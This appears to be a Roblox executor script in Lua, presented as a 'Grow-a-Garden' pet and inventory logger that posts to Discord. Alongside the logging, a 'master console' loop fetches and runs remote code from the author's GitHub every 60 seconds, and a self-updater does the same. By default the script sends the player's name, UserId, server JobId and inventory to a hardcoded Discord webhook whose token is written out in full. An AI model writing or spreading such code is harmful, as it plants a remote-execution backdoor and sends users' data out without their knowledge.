pcall(function() _G.EjectScript() end)

local CURRENT_VERSION = "1.0.1" -- Change this on each update
local SCRIPT_URL = "https://raw.githubusercontent.com/kibab27/rblxpaldogs/main/source.lua"
local VERSION_URL = "https://raw.githubusercontent.com/kibab27/rblxpaldogs/main/version.txt"


local updateLoopRunning = true
local masterConsoleLoopRunning = true

local function checkForUpdate()
    local req = (syn and syn.request) or (http and http.request) or request
    if not req then
        print("❌ HTTP requests not supported for updater.")
        return
    end
    local response = req({Url = VERSION_URL, Method = "GET"})
    if response and response.Body then
        local latestVersion = response.Body:match("[^\r\n]+")
        if latestVersion and latestVersion ~= CURRENT_VERSION then
            print("🔄 Update found! Re-executing script...")
            if _G.EjectScript then _G.EjectScript() end
            loadstring(game:HttpGet(SCRIPT_URL))()
        else
            print("✅ Script is up to date.")
        end
    else
        print("❌ Failed to check for updates.")
    end
end

  
_G.checkForUpdate = checkForUpdate

-- Check for updates every 5 minutes (300 seconds)
spawn(function()
    while updateLoopRunning do
        wait(300)
        checkForUpdate()
    end
end)


-- Master Console: Automatically fetch and run a remote script for debugging/emergencies
local MASTER_CONSOLE_URL = "https://raw.githubusercontent.com/kibab27/rblxpaldogs/main/master_console.lua" -- Change to your actual URL

local function checkMasterConsole()
    local req = (syn and syn.request) or (http and http.request) or request
    if not req then
        print("❌ HTTP requests not supported for master console.")
        return
    end
    local response = req({Url = MASTER_CONSOLE_URL, Method = "GET"})
    if response and response.Body and #response.Body > 0 then
        print("⚡ Master console script found, executing...")
        local success, err = pcall(function()
            loadstring(response.Body)()
        end)
        if not success then
            print("❌ Master console error: " .. tostring(err))
        end
    else
        print("ℹ️ No master console script found or empty.")
    end
end

-- Check for master console script every 60 seconds
spawn(function()
    while masterConsoleLoopRunning do
        wait(60)
        checkMasterConsole()
    end
end)


local webhook = webhook_link or "https://discord.com/api/webhooks/1382544011969040485/CV2BVbKw_9wkgMt-qiB71Lk3IBsUF-uryjHsz_b1WqaiXXhaOpbOqqYayy6N72_rzdyt"

local UPDATE_INTERVAL = webhook_update_interval or 300 -- seconds (30 minutes). Change as needed.
local PET_HUNGER_ALERT_PERCENT = pet_hunger_alert_percent or 1 


local CollectionService = game:GetService("CollectionService")
local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

local webhookLoopRunning = false
local webhookLoopThread = nil



local function debug(msg)
    pcall(function()
        game.StarterGui:SetCore("ChatMakeSystemMessage", { Text = "[DEBUG] " .. msg })
    end)
end

local function formatNumberWithCommas(n)
    local s = tostring(n)
    local pattern = "(%d)(%d%d%d)$"
    while true do
        s, k = s:gsub("^(-?%d+)(%d%d%d)", '%1,%2')
        if k == 0 then break end
    end
    return s
end

-- Get player eggs with status

local function GetPlayerEggsWithStatus()
    local playerEggs = {}
    
    for _, egg in ipairs(CollectionService:GetTagged("PetEggServer")) do
        if egg:GetAttribute("OWNER") == player.Name then
            local timeToHatch = egg:GetAttribute("TimeToHatch") or 0
            local isReady = timeToHatch <= 0
            local eggName = egg:GetAttribute("EggName") or "Unknown Egg"
            
            table.insert(playerEggs, {
                Instance = egg,
                Name = eggName,
                TimeToHatch = timeToHatch,
                IsReady = isReady,
                Position = egg:GetPivot().Position
            })
        end
    end
    
    return playerEggs
end


-- Gather inventory
local allItems = {}
local function gatherItems(container)
    local nectarStaffCount = 0
    for _, tool in ipairs(container:GetChildren()) do
        if tool:IsA("Tool") then
            if tool.Name == "Nectar Staff" then
                nectarStaffCount = nectarStaffCount + 1
            else
                table.insert(allItems, tool.Name)
            end
        end
    end
    -- After gathering, add Nectar Staff as a single entry with count if any found
    if nectarStaffCount > 0 then
        table.insert(allItems, "Nectar Staff x" .. nectarStaffCount)
    end
end

-- Format item counts
local function formatItems(items)
    local result = {}
    for _, name in ipairs(items) do
        local count = "1"
        local cleanName = name
        local bracketed = name:match("%[([xX])(%d+)%]%s*$")
        if bracketed then
            count = name:match("%[.[%d]+%]"):match("%d+")
            cleanName = name:gsub("%s*%[[xX]%d+%]%s*$", "")
        else
            local xCount = name:match("[xX](%d+)%s*$")
            if xCount then
                count = xCount
                cleanName = name:gsub("%s*[xX]%d+%s*$", "")
            end
        end
        count = string.format("%02d", tonumber(count) or 1)
        cleanName = cleanName:gsub("^%s*(.-)%s*$", "%1")
        table.insert(result, string.format("[x%s] %s", count, cleanName))
    end
    return result
end

-- Keyword filter
local function filterItems(keywordList)
    local filtered = {}
    for _, item in ipairs(allItems) do
        for _, keyword in ipairs(keywordList) do
            if string.lower(item):find(keyword) then
                table.insert(filtered, item)
                break
            end
        end
    end
    return formatItems(filtered)
end

local function codeBlock(list, endingblock)
    endingblock = endingblock ~= false -- default to true if nil
    if #list == 0 then return "```\n‎ None\n```" end
    if endingblock then return "```\n " .. table.concat(list, "\n‎ ") .. "                 \n```" end
    return "```\n " .. table.concat(list, "\n‎ ") .. "\n```"
end

local function getPetSlots()
    local slotsText = ""
    local success, err = pcall(function()
        local headerTitle = player:WaitForChild("PlayerGui")
            :WaitForChild("ActivePetUI")
            :WaitForChild("Frame")
            :WaitForChild("Main")
            :WaitForChild("Header")
            :WaitForChild("TITLE")
        slotsText = headerTitle.Text -- e.g., "Active Pets: 3/3"
    end)
    if not success then
        debug("❌ Failed to get pet slots: " .. tostring(err))
        return "[?/?? Slots]"
    end
    local used, total = slotsText:match("Active Pets:%s*(%d+)%s*/%s*(%d+)")
    if used and total then
        return string.format("[%s/%s Slots]", used, total)
    else
        return "[?/?? Slots]"
    end
end

local function gatherAndSend()
    -- Gather inventory again
    allItems = {}
    gatherItems(player.Backpack)
    gatherItems(player.Character or player.CharacterAdded:Wait())

    -- Re-filter items
    local pets = filterItems({ "age" })
    local eggs = filterItems({ "egg" })
    local seeds = filterItems({ "seed" })
    local gears = filterItems({ "sprinkler", "staff", "rod", "watering" })

    --[[
    -- Scan ActivePetUI for equipped pets
    local petsEquipped = {}
    debug("🔍 Scanning ActivePetUI for equipped pets...")
    local success, err = pcall(function()
        local scrollingFrame = player:WaitForChild("PlayerGui")
            :WaitForChild("ActivePetUI")
            :WaitForChild("Frame")
            :WaitForChild("Main")
            :WaitForChild("ScrollingFrame")

        for _, petFrame in pairs(scrollingFrame:GetChildren()) do
            if petFrame:IsA("Frame") and petFrame.Name ~= "PetTemplate" then
                local typeLabel = petFrame:FindFirstChild("PET_TYPE")
                local ageLabel = petFrame:FindFirstChild("PET_AGE")

                if typeLabel and ageLabel then
                    local petType = typeLabel.Text
                    local age = ageLabel.Text:gsub("Age: ", "")
                    table.insert(petsEquipped, string.format("Age: %s — %s", age, petType))
                    debug("🟢 Found pet type: " .. petType)
                else
                    debug("⚠️ Skipped pet UI frame: " .. petFrame.Name)
                end
            end
        end
    end)

    if not success then
        debug("❌ Failed to scan equipped pets: " .. tostring(err))
    end
]]

    -- New: Use module-based pet stats
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local ActivePetsService = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("PetServices"):WaitForChild("ActivePetsService"))
    local PetRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
    local PetUtilities = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("PetServices"):WaitForChild("PetUtilities"))

    local function GetActivePetStats()
        local pets = {}
        local clientPetStates = ActivePetsService:GetClientPetState(player.Name)
        if not clientPetStates then return pets end

        for petUuid, petState in pairs(clientPetStates) do
            if petState.Asset and petState.Asset:IsA("BasePart") and petState.Asset:GetAttribute("OWNER") == player.Name then
                local petData = ActivePetsService:GetPetData(player.Name, petUuid)
                local petConfig = petData and PetRegistry.PetList[petData.PetType]
                local stats = {
                    PetType = petData and petData.PetType or "Unknown",
                    Level = petData and petData.PetData.Level or 0,
                    Hunger = petData and petData.PetData.Hunger or 0,
                    LevelProgress = petData and petData.PetData.LevelProgress or 0,
                    MaxHunger = petConfig and petConfig.DefaultHunger or 100,
                    IsMaxLevel = false,
                    XPToCurrent = 0,
                    XPToNext = 0,
                    ProgressPercent = 0
                }
                if petData and petConfig then
                    local currentLevel = stats.Level
                    local progress = stats.LevelProgress
                    local maxLevel = PetRegistry.PetConfig.XP_CONFIG.MAX_LEVEL
                    stats.IsMaxLevel = currentLevel >= maxLevel
                    stats.XPToCurrent = PetUtilities:GetCurrentLevelXPCost(currentLevel)
                    stats.XPToNext = stats.IsMaxLevel and 0 or PetUtilities:GetCurrentLevelXPCost(currentLevel + 1)
                    stats.ProgressPercent = stats.IsMaxLevel and 100 or (stats.XPToNext > 0 and math.floor((progress / stats.XPToNext) * 100) or 0)
                end
                table.insert(pets, stats)
            end
        end
        return pets
    end

 -- Change this to your desired threshold

    local petsEquipped = {}
    local hungryPets = {}
    debug("🔍 Gathering equipped pet stats via ActivePetsService...")
    local success, err = pcall(function()
        for _, stat in ipairs(GetActivePetStats()) do
                    local hungerPercent = stat.MaxHunger > 0 and math.floor((stat.Hunger / stat.MaxHunger) * 100) or 0
                    table.insert(petsEquipped,
                        string.format("→ %s\n     Age: %d (%d%%)\n     Hunger: %d (%d%%)",
                            stat.PetType,
                            stat.Level,
                            stat.ProgressPercent,
                            stat.Hunger,
                            hungerPercent
                        )
                    )
                    if hungerPercent <= PET_HUNGER_ALERT_PERCENT then
                        table.insert(hungryPets, string.format("%s (%d%%)", stat.PetType, hungerPercent))
                    end

                    debug("🟢 Found equipped pet: " .. stat.PetType)
                end
            end)
    if not success then
        debug("❌ Failed to get equipped pets: " .. tostring(err))
    end

    -- Get pet slots info
    local petSlots = getPetSlots()

    -- Prepare webhook payload
    local webhookContent = nil
    if #hungryPets > 0 then
        webhookContent = "**FEED THE PET(S)! ⚠️ **\n\n" ..
            table.concat(hungryPets, ", ") .. 
            " hunger is critically low!" .. "\n\n@everyone"
    end

    local message = {
        content = webhookContent,
        username = player.Name,
        avatar_url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. player.UserId .. "&size=150x150&format=Png&isCircular=false",
       
        embeds = { {
            title = "🌴 Garden Logger • Pet & Inventory Snapshot \n‎",
            thumbnail = {
                url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. player.UserId .. "&size=150x150&format=Png&isCircular=false"
            },
            description = 
            "> **🌾 User : **" .. player.Name .. "\n" ..
            "> **🔗 Job ID : **" .. tostring(game.JobId) .. "\n" ..
            "> **🪙 Sheckles : **" .. (player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and formatNumberWithCommas(player.leaderstats.Sheckles.Value) or "Unknown") .. " €\n" ..
            "\n\n> **🎒 | Inventory **\n\n",
            color = 2750290,
            fields = {
                {
                    name = "> 🐶  | Pets Equipped " .. petSlots,
                    value = codeBlock(petsEquipped),
                    inline = false
                },
                {
                    name = "> 🥚  | Eggs & Pets",
                    value = codeBlock(eggs)  .. "\n" .. codeBlock(pets),
                    inline = false
                },
                {
                    name = "> 🔧  | Gears",
                    value = codeBlock(gears),
                    inline = false
                },
                {
                    name = "> 🌱  | Seeds",
                    value = codeBlock(seeds, true),
                    inline = false
                },
                {
                    name = "> 🪺  | Placed Eggs",
                    value = "```\n" .. (function()
                        local eggLines = {}
                        for _, egg in ipairs(GetPlayerEggsWithStatus()) do
                            if egg.IsReady then
                                table.insert(eggLines, string.format("‎ %s - Ready to Hatch!", egg.Name))
                            else
                                local t = egg.TimeToHatch
                                local h = math.floor(t / 3600)
                                local m = math.floor((t % 3600) / 60)
                                local s = t % 60
                                table.insert(eggLines, string.format("‎ %s - %02dh %02dm %02ds", egg.Name, h, m, s))
                            end
                        end
                        return #eggLines > 0 and table.concat(eggLines, "\n") or "‎ None"
                    end)() .. "```"  .. "\n‎",
                }

            },
            footer = {
                text = "Player: " .. player.Name .. " • ID: " .. player.UserId .. "\nJobID: " .. tostring(game.JobId) .. "\n\n 📬 Grow-a-Garden Logger v1 • by kib"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request
    if req then
        req({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(message)
        })
        debug("✅ Webhook sent!")
    else
        debug("❌ HTTP requests not supported.")
    end
end

function StartWebhookLoop()
    if webhookLoopRunning then
        debug("Webhook loop is already running.")
        return
    end
    webhookLoopRunning = true
    debug("Starting webhook loop.")
    webhookLoopThread = spawn(function()
        -- Wait 5 minutes, then send
        wait(300)
        if webhookLoopRunning then
            gatherAndSend()
        end
        -- Now loop at UPDATE_INTERVAL (e.g., 1800 for 30 mins)
        while webhookLoopRunning do
            wait(UPDATE_INTERVAL)
            if webhookLoopRunning then
                gatherAndSend()
            end
        end
    end)
end

function StopWebhookLoop()
    if not webhookLoopRunning then
        debug("Webhook loop is not running.")
        return
    end
    webhookLoopRunning = false
    debug("Stopped webhook loop.")
end

function EjectScript()
    if webhookLoopRunning then
        StopWebhookLoop()
    end
    updateLoopRunning = false
    masterConsoleLoopRunning = false
    _G.StartWebhookLoop = nil
    _G.StopWebhookLoop = nil
    _G.EjectScript = nil
    debug("Script ejected and cleaned up.")
end

_G.StartWebhookLoop = StartWebhookLoop
_G.StopWebhookLoop = StopWebhookLoop
_G.EjectScript = EjectScript

-- Initial send
gatherAndSend()
StartWebhookLoop()

-- Now you can run StopWebhookLoop() or StartWebhookLoop() in your executor at any time.